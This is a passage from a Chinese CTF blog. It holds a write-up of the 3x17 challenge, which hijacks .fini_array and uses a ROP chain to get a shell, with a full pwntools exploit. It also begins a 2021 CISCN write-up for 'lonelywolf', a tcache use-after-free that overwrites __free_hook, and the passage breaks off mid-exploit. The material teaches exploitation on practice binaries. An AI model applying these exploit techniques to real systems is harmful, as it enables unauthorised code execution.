plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  checksec 3x17 </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序去了符号，经过之前对<code>_start</code>函数的学习很容易知道<code>main</code>函数的位置，找到<code>_start</code>之后，<code>__libc_start_main</code>的第一个参数就是<code>main</code>函数地址：</p><img src="/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/4.jpg" class="" width="4"><p>下面就是<code>main</code>函数，部分函数已经通过分析加上了符号，程序的逻辑很简单，就是读入一个地址，然后再这个地址上写数据，但只可以写<code>0x18</code>的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_401B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)++byte_4B9330;</span><br><span class="line">  <span class="keyword">if</span> ( byte_4B9330 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sys_write(<span class="number">1u</span>, <span class="string">&quot;addr:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    sys_read(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">    v1 = (<span class="keyword">char</span> *)(<span class="keyword">int</span>)sub_40EE70((__int64)buf);</span><br><span class="line">    sys_write(<span class="number">1u</span>, <span class="string">&quot;data:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    sys_read(<span class="number">0</span>, v1, <span class="number">0x18</span>uLL);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v3 )</span><br><span class="line">    error();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先肯定是考虑前面说到的一种做法，修改<code>_fini_array[0]</code>为<code>one_gadget</code>或者是<code>shellcode</code>的地址，再或者是其他可拿<code>shell</code>的函数，<code>shellcode</code>读不进去，栈地址也不能泄露，可拿<code>shell</code>的函数也没有，那<code>one_gadget</code>呢？由于程序是静态的，所以只能在程序本身里面寻找，答案很显然，没有….</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  one_gadget 3x17 </span><br><span class="line">[OneGadget] ArgumentError: File <span class="string">&quot;/home/laohu/Documents/pwn/others/3x17_fini prix/3x17&quot;</span> doesn<span class="string">&#x27;t contain string &quot;/bin/sh&quot;, not glibc?</span></span><br></pre></td></tr></table></figure><p>那么就是第二种做法了，让<code>__libc_csu_fini</code>循环起来，仔细想想如果循环的地址设置成<code>main</code>，会发生什么？它会使<code>byte_4B9330</code>疯狂加<code>1</code>，同时它是<code>unsigned __int8</code>类型的变量，疯狂加<code>1</code>会使它整数溢出，所以它总有加到<code>1</code>的时候，一旦它的值为<code>1</code>，我们就有了一次任意地址读的机会，这样就可以循环读入我们的<code>ROP</code>，每次都能读<code>0x18</code>的大小，按照理论来说我们就可以把<code>ROP</code>读到任何地方，但这里只讨论劫持<code>fini_array</code>，通过<code>objdump</code>来得到<code>fini_array</code>地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  objdump -h ./3x17 </span><br><span class="line"></span><br><span class="line">./3x17：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">节：</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line"> 15 .fini_array   00000010  00000000004b40f0  00000000004b40f0  000b30f0  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>写入的位置选在<code>fini_array+0x10</code>，那…为什么是这个位置呢？回到刚刚的写<code>ROP</code>，我们写入了<code>ROP</code>，那必然要把<code>esp</code>指过去，对不对？那肯定是要用到栈迁移，那写完<code>ROP</code>之后，再次覆盖<code>_fini_array[1]</code>实现栈迁移就会是下面这个场景：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(ebp = 0x4b40f0)</span><br><span class="line">call   qword ptr [rbp + rbx*8] &lt;0x401580&gt;</span><br><span class="line">     ↓</span><br><span class="line">mov   rsp,rbp;rsp =&gt; 0x4b40f0</span><br><span class="line">pop    ebp    ;rsp =&gt; 0x4b40f8</span><br><span class="line">ret    ;rsp =&gt; 0x4b4100</span><br></pre></td></tr></table></figure><p>此时，<code>rsp</code>的值已经到<code>0x4b4100</code>这个位置，那我们只要在此处布置好<code>ROP+</code>栈迁移，等待<code>ret</code>返回，就可以劫持控制流了！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">write(esp,p64(pop_rax))</span><br><span class="line">write(esp+<span class="number">8</span>,p64(exe_call))</span><br><span class="line">write(esp+<span class="number">16</span>,p64(pop_rdi))</span><br><span class="line">write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(esp+<span class="number">32</span>,p64(pop_rdx))</span><br><span class="line">write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">48</span>,p64(pop_rsi))</span><br><span class="line">write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">64</span>,p64(syscall))</span><br><span class="line">write(bin_sh_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">write(fini_array,p64(leave_ret))</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;3x17&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;3x17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line">exe_call = <span class="number">0x3b</span></span><br><span class="line">esp = <span class="number">0x4B4100</span></span><br><span class="line">syscall = <span class="number">0x471db5</span></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdx = <span class="number">0x446e35</span></span><br><span class="line">pop_rsi = <span class="number">0x406c30</span></span><br><span class="line">pop_rdi = <span class="number">0x401696</span></span><br><span class="line">bin_sh_addr = <span class="number">0x4B4200</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="built_in">str</span>(addr))</span><br><span class="line">io.recv()</span><br><span class="line">io.send(data)</span><br><span class="line"></span><br><span class="line">write(fini_array,p64(libc_csu_fini)+p64(main_addr))</span><br><span class="line">write(esp,p64(pop_rax))</span><br><span class="line">write(esp+<span class="number">8</span>,p64(exe_call))</span><br><span class="line">write(esp+<span class="number">16</span>,p64(pop_rdi))</span><br><span class="line">write(esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(esp+<span class="number">32</span>,p64(pop_rdx))</span><br><span class="line">write(esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">48</span>,p64(pop_rsi))</span><br><span class="line">write(esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(esp+<span class="number">64</span>,p64(syscall))</span><br><span class="line">write(bin_sh_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">write(fini_array,p64(leave_ret))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://www.freebuf.com/articles/system/226003.html">https://www.freebuf.com/articles/system/226003.html</a></p><p><a href="https://www.mrskye.cn/archives/2a024e">https://www.mrskye.cn/archives/2a024e</a></p><span id="more"></span><p>本文由<strong>12138</strong>原创发布<br>转载，请参考<a href="https://www.anquanke.com/note/repost">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/254520">https://www.anquanke.com/post/id/254520</a><br>安全客 - 有思想的安全新媒体</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021·CISCN国赛初赛WP</title>
      <link href="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/"/>
      <url>/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="2021·CISCN国赛初赛WP"><a href="#2021·CISCN国赛初赛WP" class="headerlink" title="2021·CISCN国赛初赛WP"></a>2021·CISCN国赛初赛WP</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h3><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/10.png" class=""><p>保护全开，并且是在<code>libc-2.27.so</code>，含有<code>tache bin</code></p><p>alloc没啥，挺常规的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">alloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_F44, &amp;size);   <span class="comment">//index得等于0</span></span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(&amp;unk_F44, &amp;size);</span><br><span class="line">    v1 = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )                          <span class="comment">// 不能分配超过0x78的块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        chunk_size = v1;</span><br><span class="line">        chunk_ptr = v2;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆块的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    chunk_size;</span><br><span class="line">    chunk_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点在这，由于tache的缘故导致uaf漏洞更加好利用了…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_F44, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; chunk_ptr )</span><br><span class="line">    <span class="built_in">free</span>(chunk_ptr);                            <span class="comment">// uaf</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于没有清零<code>chunk_ptr</code>，导致被free的chunk也能show</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_F44, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; chunk_ptr )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Content: %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)chunk_ptr);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit很常规，并没有<code>off-by-one</code>，但是由于<code>chunk_ptr</code>没有置零所以可以随便写</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(&amp;unk_F44, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      v0 = chunk_ptr;</span><br><span class="line">      <span class="keyword">if</span> ( chunk_size )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = (<span class="keyword">char</span> *)chunk_ptr + chunk_size;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          read(<span class="number">0</span>, v0, <span class="number">1uLL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( *v0 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ++v0 == v1 )</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">        &#125;</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这得先泄露<code>heap_base</code>和<code>libc_base</code>，前者为了劫持<code>tache</code> 控制堆块，后者为了<code>one_gadget</code></p><p>泄露也很简单，通过改变key来<code>double free</code>，<code>tache</code>的出现让<code>double free</code>变得异常简单，连堆块的大小都不用检查了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>直接show就能泄露堆地址了</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/11.png" class=""><p>泄露了堆的基地址之后呢，我们就可以修改<code>tache bin</code>的fd来劫持tache 控制堆块，add两次我们就得到了控制堆块，通过写让它以往0x250的堆块已经满了，然后把这个控制堆块free掉就能进入<code>unsorted bin</code>里面，之后show除了就能得到libc的基地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(heap_base + <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/12.png" class=""><p>之后再此往控制堆块里面写入<code>__free_hook</code>的地址，再add出来就能写它为<code>one_gadget</code>了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x03&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x3f</span>+p64(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(one_gadget))</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/13.png" class=""><p>getshell！</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;lonelywolf&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;lonelywolf&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    io.sendline(<span 